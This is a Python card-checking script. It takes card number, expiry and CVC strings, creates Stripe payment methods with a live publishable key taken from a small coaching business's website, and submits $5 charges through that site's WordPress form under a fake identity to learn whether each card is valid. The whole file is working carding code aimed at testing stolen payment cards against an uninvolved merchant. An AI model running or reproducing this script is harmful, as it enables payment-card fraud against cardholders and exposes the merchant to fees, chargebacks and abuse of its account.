import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffa08954a1b%3B+stripe-js-v3%2Ffa08954a1b%3B+card-element&key=pk_live_51H9dcaDobkN1IgJfc3jeP65zrDs4qbpW7sdt5UbOUoJ2aEzDPwikvCFA7nHqFOJungpIGIqujmCklv1Pe3igTkHo00axUaHXxM'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'dandelion-seeds.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://dandelion-seeds.com',
	    'referer': 'https://dandelion-seeds.com/coaching/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1747170388158',
	}
	
	data = f"data=__fluent_form_embded_post_id%3D36%26_fluentform_13_fluentformnonce%3Dfa507e1697%26_wp_http_referer%3D%252Fcoaching%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26phone%3D4303000850%26repeater_field%255B0%255D%255B%255D%3D%26input_text%3DU.S.A%26input_text_1%3DGoogle%26description%3Dparent%26description_1%3DCoaching%26input_radio%3DI'm%2520peaceful%2520most%2520of%2520the%2520time%2520but%2520want%2520to%2520take%2520my%2520parenting%2520to%2520the%2520next%2520level.%26description_2%3D%26input_radio_3%3DNone%2520of%2520those%2520work%2520but%2520please%2520put%2520me%2520on%2520a%2520waitlist%2520for%2520future%2520sessions.%26input_radio_5%3DI%2520understand%2520and%2520agree.%26input_radio_2%3DI%2520agree%26input_radio_1%3DI%2520agree%26input_radio_4%3DI%2520will%2520email%2520Sarah%2520now%2520(sarah%2540dandelion-seeds.com)%2520to%2520inquire%2520about%2520the%2520possibility%2520of%2520a%2520needs-based%2520scholarship.%26input_text_2%3D%26names_1%255Bfirst_name%255D%3D%26names_1%255Blast_name%255D%3D%26payment_input%3D5%26payment_method%3Dstripe%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=13"
	
	response = requests.post(
	    'https://dandelion-seeds.com/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)

	try:	
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
			
	return (result)
